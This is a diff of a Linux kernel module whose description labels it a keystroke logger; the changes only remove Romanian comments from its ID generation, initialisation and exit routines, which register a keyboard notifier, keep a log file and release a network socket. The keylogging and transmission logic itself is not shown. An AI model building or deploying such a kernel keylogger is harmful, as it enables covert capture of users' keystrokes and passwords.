@@ -11,8 +11,8 @@ MODULE_DESCRIPTION("Un simplu modul pentru logarea tastelor");
 MODULE_VERSION("0.1");
 
 static unsigned int generate_unique_id(void) {
-    u64 timestamp = ktime_get_real_ns(); // Timpul curent în nanosecunde
-    return (unsigned int)(timestamp %99999); // Returnează doar o parte (32 biți)
+    u64 timestamp = ktime_get_real_ns(); 
+    return (unsigned int)(timestamp %99999); 
 }
 
 static struct KEYLOGGER *keylogger;
@@ -28,7 +28,7 @@ static int __init keyboard_logger_init(void)
         kfree(keylogger);
         return -ENOMEM;
     }
-    //mutex_init(&(clipboard->lock));
+ 
 
     keylogger->id = generate_unique_id();
     pr_info("Keylogger initialized with ID: %d\n", keylogger->id);
@@ -74,18 +74,18 @@ static int __init keyboard_logger_init(void)
 
 static void __exit keyboard_logger_exit(void) {
     if (keylogger) {
-        flush_work(&keylogger->work_struct);     // Orice alt task asociat work_struct
+        flush_work(&keylogger->work_struct);  
 
-        // De-înregistrează notifier-ul de la tastatură
+       
         unregister_keyboard_notifier(&keylogger->key_notifier);
 
-        // Închide fișierul dacă a fost deschis
+     
         if (keylogger->filename) {
             filp_close(keylogger->filename, NULL);
         }
         if (keylogger->socket)
             sock_release(keylogger->socket);
-        // Eliberează memoria
+        
         kfree(keylogger);
     }
 }
